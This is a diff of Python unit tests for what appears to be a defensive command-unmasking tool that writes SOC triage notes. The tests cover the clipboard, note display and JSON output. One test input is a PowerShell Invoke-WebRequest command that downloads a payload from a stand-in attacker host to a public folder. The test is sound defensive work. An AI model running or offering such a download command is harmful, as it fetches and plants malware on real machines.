@@ -3,8 +3,13 @@
 from __future__ import annotations
 
 import base64
+import io
+import json
 import unittest
+from contextlib import redirect_stdout
+from unittest.mock import patch
 
+from cmd_unmask.cli import main as cli_main
 from cmd_unmask.unpacker import unmask_command
 from cmd_unmask.renderer import render_pretty
 
@@ -36,7 +41,7 @@ class TestTacticalHudLayout(unittest.TestCase):
         self.assertIn("[2] BEHAVIORAL EVIDENCE & CAPABILITIES", out)
         self.assertIn("[3] EXTRACTED IOCs (DEFANGED)", out)
         self.assertIn("[4] RECOMMENDED L1/L2 NEXT STEPS", out)
-        self.assertIn("[5] READY-TO-PASTE SOC TICKET NOTE", out)
+        self.assertNotIn("READY-TO-PASTE SOC TICKET NOTE", out)
 
         self.assertNotIn("[BEHAVIORAL CAPABILITIES]", out)
         self.assertNotIn("[VERDICT RATIONALE]", out)
@@ -51,7 +56,7 @@ class TestTacticalHudLayout(unittest.TestCase):
         self.assertIn("[2] BEHAVIORAL EVIDENCE: None", out)
         self.assertNotIn("[3] EXTRACTED IOCs", out)
         self.assertIn("[3] RECOMMENDED L1/L2 NEXT STEPS", out)
-        self.assertIn("[4] READY-TO-PASTE SOC TICKET NOTE", out)
+        self.assertNotIn("READY-TO-PASTE SOC TICKET NOTE", out)
 
     def test_no_color_uses_strict_ascii_borders_without_jagged_lines(self) -> None:
         inner = "Invoke-WebRequest -Uri http://drop.evil.example/payload.bin -OutFile C:\\Users\\Public\\p.bin"
@@ -82,6 +87,57 @@ class TestTacticalHudLayout(unittest.TestCase):
         self.assertGreaterEqual(len(box_lines), 4)
         widths = {len(line) for line in box_lines}
         self.assertEqual(len(widths), 1, f"Jagged HUD box widths: {widths}")
+
+    def test_pretty_default_omits_duplicate_note_and_prints_clipboard_banner(self) -> None:
+        copied: list[str] = []
+        buf = io.StringIO()
+        with (
+            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
+            redirect_stdout(buf),
+            patch.object(buf, "isatty", return_value=True),
+        ):
+            rc = cli_main(["-c", "ipconfig /all", "--no-color"])
+
+        out = buf.getvalue()
+        self.assertEqual(rc, 0)
+        self.assertEqual(len(copied), 1)
+        self.assertIn("[SOC TRIAGE NOTE", copied[0])
+        self.assertNotIn("[SOC TRIAGE NOTE", out)
+        self.assertIn("SOC Ticket Note copied to clipboard (use --show-note to print)", out)
+
+    def test_show_note_flag_prints_full_ticket_note_on_stdout(self) -> None:
+        buf = io.StringIO()
+        with (
+            patch("cmd_unmask.cli.set_clipboard_text", return_value=True),
+            redirect_stdout(buf),
+        ):
+            rc = cli_main(["-c", "ipconfig /all", "--no-color", "--show-note"])
+
+        out = buf.getvalue()
+        self.assertEqual(rc, 0)
+        self.assertIn("[SOC TRIAGE NOTE", out)
+        self.assertIn("Unmasked Cmd  :", out)
+
+    def test_no_copy_prints_show_note_hint_and_json_stays_pure(self) -> None:
+        copied: list[str] = []
+        buf = io.StringIO()
+        with (
+            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
+            redirect_stdout(buf),
+            patch.object(buf, "isatty", return_value=True),
+        ):
+            rc = cli_main(["-c", "ipconfig /all", "--no-color", "--no-copy"])
+
+        self.assertEqual(rc, 0)
+        self.assertEqual(copied, [])
+        self.assertIn("use --show-note to print", buf.getvalue())
+
+        json_buf = io.StringIO()
+        with redirect_stdout(json_buf):
+            rc_json = cli_main(["-c", "ipconfig /all", "--format", "json"])
+        self.assertEqual(rc_json, 0)
+        parsed = json.loads(json_buf.getvalue())
+        self.assertIsInstance(parsed, dict)
 
 
 if __name__ == "__main__":
